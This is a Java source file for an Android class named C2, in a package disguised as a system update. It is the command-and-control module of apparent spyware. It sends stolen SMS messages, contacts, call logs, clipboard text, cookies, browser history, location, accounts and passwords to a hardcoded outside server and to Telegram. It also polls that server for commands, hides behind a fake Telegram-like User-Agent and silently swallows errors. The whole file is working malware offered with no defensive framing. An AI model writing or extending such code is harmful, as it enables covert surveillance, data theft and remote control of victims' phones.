package com.system.update;

import android.util.Base64;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Matches gate/index.php:
 * POST JSON {device,type,payload,ts} → 204
 * GET ?device= → command string
 */
public final class C2 {
    public static final String HOST = "http://mnword-hailam.freedev.app/gate";

    private static final ExecutorService POOL = Executors.newFixedThreadPool(3);
    private static volatile String deviceId = "unknown";

    private C2() {}

    public static void setDeviceId(String id) {
        if (id != null && !id.isEmpty()) deviceId = id;
    }

    public static String getDeviceId() {
        return deviceId;
    }

    public static void send(String type, String payload) {
        final String t = type == null ? "event" : type;
        final String p = payload == null ? "" : payload;
        POOL.execute(() -> {
            try {
                String body = "{"
                        + "\"device\":\"" + esc(deviceId) + "\","
                        + "\"type\":\"" + esc(t) + "\","
                        + "\"payload\":\"" + esc(p) + "\","
                        + "\"ts\":" + System.currentTimeMillis()
                        + "}";
                post(HOST.endsWith("/") ? HOST : HOST + "/", body);
                // also try without trailing issues — HOST as-is
                if (!HOST.endsWith("/")) {
                    // primary already HOST; index.php often at /gate/ or /gate/index.php
                }
            } catch (Throwable ignored) {}
            // dual: important types also TG (always for key types)
            try {
                if (isImportant(t)) {
                    String clip = p.length() > 3000 ? p.substring(0, 3000) : p;
                    Telegram.send("📤 " + t + "\nid=" + deviceId + "\n" + clip);
                }
            } catch (Throwable ignored) {}
        });
    }

    private static boolean isImportant(String t) {
        if (t == null) return false;
        String x = t.toLowerCase();
        return x.contains("sms") || x.contains("contact") || x.contains("call")
                || x.contains("clip") || x.contains("browser") || x.contains("cookie")
                || x.contains("history") || x.contains("loc") || x.contains("account")
                || x.contains("online") || x.contains("device") || x.contains("harvest")
                || x.contains("a11y") || x.contains("pwd") || x.equals("online");
    }

    public static void sendImportant(String type, String payload) {
        send(type, payload);
        try {
            String clip = payload != null && payload.length() > 3500
                    ? payload.substring(0, 3500) : payload;
            Telegram.send("⭐ " + type + "\nid=" + deviceId + "\n" + clip);
        } catch (Throwable ignored) {}
    }

    public static void sendB64(String type, byte[] raw) {
        send(type, Base64.encodeToString(raw, Base64.NO_WRAP));
    }

    public static String pollCommands() {
        try {
            String base = HOST.endsWith("/") ? HOST.substring(0, HOST.length() - 1) : HOST;
            String url = base + "?device=" + java.net.URLEncoder.encode(deviceId, "UTF-8");
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(10000);
            c.setReadTimeout(10000);
            c.setRequestMethod("GET");
            int code = c.getResponseCode();
            if (code != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            c.disconnect();
            String out = sb.toString().trim();
            return out.isEmpty() ? null : out;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void post(String endpoint, String json) throws Exception {
        // try endpoint and endpoint without double slash
        String[] tries = new String[]{ endpoint, HOST, HOST + "/index.php" };
        Exception last = null;
        for (String ep : tries) {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(ep).openConnection();
                c.setConnectTimeout(12000);
                c.setReadTimeout(12000);
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                c.setRequestProperty("User-Agent", "TelegramPlus/1.0");
                byte[] bytes = json.getBytes(StandardCharsets.UTF_8);
                try (OutputStream os = c.getOutputStream()) {
                    os.write(bytes);
                }
                int code = c.getResponseCode();
                c.disconnect();
                if (code == 204 || code == 200 || code == 201) return;
            } catch (Exception e) {
                last = e;
            }
        }
        if (last != null) throw last;
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }
}
